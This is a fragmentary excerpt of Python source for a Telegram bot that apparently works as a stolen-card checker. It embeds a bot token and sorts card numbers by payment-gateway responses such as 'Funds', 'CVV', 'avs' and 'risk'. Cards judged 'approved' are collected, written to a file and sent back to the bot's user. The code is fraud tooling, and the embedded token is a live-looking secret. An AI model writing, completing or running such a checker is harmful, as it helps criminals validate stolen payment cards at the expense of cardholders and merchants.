...
stopuser = {}
token = '7145862669:AAGJIlWbw9k6sD6goUSP9PwpJ6GbRdOFD7M'
...
𝗕𝗼𝘁 𝗕𝘆: @the_FJU</b>'''
                    if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
                        ...
                        approved_cards.append(f"{cc.strip()}\n")
                    elif 'risk' in last:
                        riskk+=1
                    elif 'CVV' in last:
                        ccnn+=1
        ...
        if approved_cards:
            approved_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗖𝗔𝗥𝗗𝗦 ✅:\n" + "".join(approved_cards)
            bot.send_message(call.from_user.id, approved_text)

            with open("approved_cards.txt", "w") as f:
                f.writelines(approved_cards)

            with open("approved_cards.txt", "rb") as f:
                bot.send_document(call.from_user.id, f, caption="𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗖𝗔𝗥𝗗𝗦 ✅")
    my_thread = threading.Thread(target=my_function)
    my_thread.start()
